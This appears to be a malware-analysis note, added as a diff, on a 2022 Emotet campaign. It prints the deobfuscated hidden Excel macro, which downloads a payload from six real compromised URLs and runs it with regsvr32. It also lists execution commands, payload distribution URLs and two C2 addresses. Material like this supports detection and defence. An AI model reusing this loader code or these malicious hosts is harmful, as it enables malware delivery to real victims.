@@ -1,0 +1,70 @@
+Emotet 2022 | epoch4 | 25.03.2022 | 
+
+************************************************************************************************************
+
+.zip 4a18d9c74c763d165d598ef0f2df9339009825edf54b2ef2f2d8bcba5cd33289
+.xls c41e8de18571125db4a50a2180f528d5b78aaeeabbb1506d9aa57ec53a484890
+.dll 87f76fbe04e43c5e1aec357c751b9488369a1967ca55172e7d45a2c6288b6017
+
+************************************************************************************************************
+
+Hidden macro sheet:
+
+					=FORMULA(Vv1!P22&Vv1!H9&Vv1!L2&Vv1!B15&Vv1!B15&Vv2!B3&Vv2!D7&Vv2!G11&Vv1!H4&Vv2!L9&Vv3!D15&Vv2!D17&Vv3!D9&Vv3!J16,F12)=FORMULA(Vv1!P22&Vv1!J11&Vv1!B18&Vv1!P11&"HRHRE1"&Vv3!P5&Vv1!H9&Vv1!L2&Vv1!B15&Vv1!B15&Vv2!B3&Vv2!D7&Vv2!G11&Vv1!H4&Vv2!L9&Vv3!D15&Vv2!E19&Vv3!D9&Vv3!J16&Vv1!P13,F14)=FORMULA(Vv1!P22&Vv1!J11&Vv1!B18&Vv1!P11&"HRHRE2"&Vv3!P5&Vv1!H9&Vv1!L2&Vv1!B15&Vv1!B15&Vv2!B3&Vv2!D7&Vv2!G11&Vv1!H4&Vv2!L9&Vv3!D15&Vv2!F17&Vv3!D9&Vv3!J16&Vv1!P13,F16)=FORMULA(Vv1!P22&Vv1!J11&Vv1!B18&Vv1!P11&"HRHRE3"&Vv3!P5&Vv1!H9&Vv1!L2&Vv1!B15&Vv1!B15&Vv2!B3&Vv2!D7&Vv2!G11&Vv1!H4&Vv2!L9&Vv3!D15&Vv2!G19&Vv3!D9&Vv3!J16&Vv1!P13,F18)=FORMULA(Vv1!P22&Vv1!J11&Vv1!B18&Vv1!P11&"HRHRE4"&Vv3!P5&Vv1!H9&Vv1!L2&Vv1!B15&Vv1!B15&Vv2!B3&Vv2!D7&Vv2!G11&Vv1!H4&Vv2!L9&Vv3!D15&Vv2!H17&Vv3!D9&Vv3!J16&Vv1!P13,F20)=FORMULA(Vv1!P22&Vv1!J11&Vv1!B18&Vv1!P11&"HRHRE5"&Vv3!P5&Vv1!H9&Vv1!L2&Vv1!B15&Vv1!B15&Vv2!B3&Vv2!D7&Vv2!G11&Vv1!H4&Vv2!L9&Vv3!D15&Vv2!I19&Vv3!D9&Vv3!J16&Vv1!P13,F22)=FORMULA(Vv1!P22&Vv1!J11&Vv1!B18&Vv1!P11&"HRHRE6"&Vv3!P5&Vv1!H9&Vv1!B15&Vv1!I17&Vv1!I3&Vv1!H13&Vv1!P11&Vv1!K9&Vv1!P13&Vv1!P7&Vv1!P13,F26)=FORMULA(Vv1!P22&Vv1!H13&Vv1!N4&Vv1!H13&Vv1!H9&Vv1!P11&Vv1!P15&Vv1!H9&Vv1!P20&Vv3!L11&Vv3!T2&Vv1!C3&Vv3!N14&Vv1!C3&Vv3!R13&Vv3!J3&Vv1!P15&Vv1!P13,F28)=FORMULA(Vv1!P22&Vv1!G24&Vv1!H13&Vv1!I26&Vv1!E11&Vv1!F4&Vv1!K23&Vv1!P11&Vv1!P13,F32)
+					
+					=CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://easiercommunications.com/wp-content/w/","..\wurod.ocx",0,0)
+					
+					=IF(HRHRE1<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://dulichdichvu.net/libraries/QhtrjCZymLp5EbqOdpKk/","..\wurod.ocx",0,0))
+					
+					=IF(HRHRE2<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https://www.whow.fr/wp-includes/H54Fgj0tG/","..\wurod.ocx",0,0))
+					
+					=IF(HRHRE3<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://genccagdas.com.tr/assets/TTHOm833iNn3BxT/","..\wurod.ocx",0,0))
+					
+					=IF(HRHRE4<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://heaventechnologies.com.pk/apitest/xdeAU0rx26LT9I/","..\wurod.ocx",0,0))
+					
+					=IF(HRHRE5<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://goonboy.com/goonie/bSFz7Av/","..\wurod.ocx",0,0))
+					
+					
+					
+					=IF(HRHRE6<0, CLOSE(0),)
+					
+					=EXEC("C:\Windows\System32\regsvr32.exe ..\wurod.ocx")
+					
+					
+					
+					=RETURN()
+
+
+http://easiercommunications.com/wp-content/w/
+http://dulichdichvu.net/libraries/QhtrjCZymLp5EbqOdpKk/
+https://www.whow.fr/wp-includes/H54Fgj0tG/
+http://genccagdas.com.tr/assets/TTHOm833iNn3BxT/
+http://heaventechnologies.com.pk/apitest/xdeAU0rx26LT9I/
+http://goonboy.com/goonie/bSFz7Av/
+
+************************************************************************************************************
+
+Exec >>
+
+EXCEL.EXE /dde C:\Users\Admin\AppData\Local\Temp\doc_11052022.xls
+
+regsvr32.exe ..\wurod.ocx
+
+regsvr32.exe "C:\Windows\system32\QsznchRqcjKcPT\dPusadEaxtdz.dll"
+
+************************************************************************************************************
+
+.dll distro
+
+https://www.clintmorey.com/wp-content/QSzbH8Ikl8E/
+https://ciberfallas.com/wp-admin/4sU1dATy/
+http://code786.com/beeldOLD/ATnNk316/
+http://combatenterprises.com/cgi-bin/1BabmNqCKBxUIzUy/
+http://sd-1684625-h00001.ferozo.net/PaginaMasVieja1321654/F1M5dBu8axuQkx0p8/
+https://comarcahoy.com.ar/wp-content/S1nkrxCcDV89DLpTXhqC/
+							
+					
+c2's
+
+150.95.66.124:8080
+63.142.250.212:443
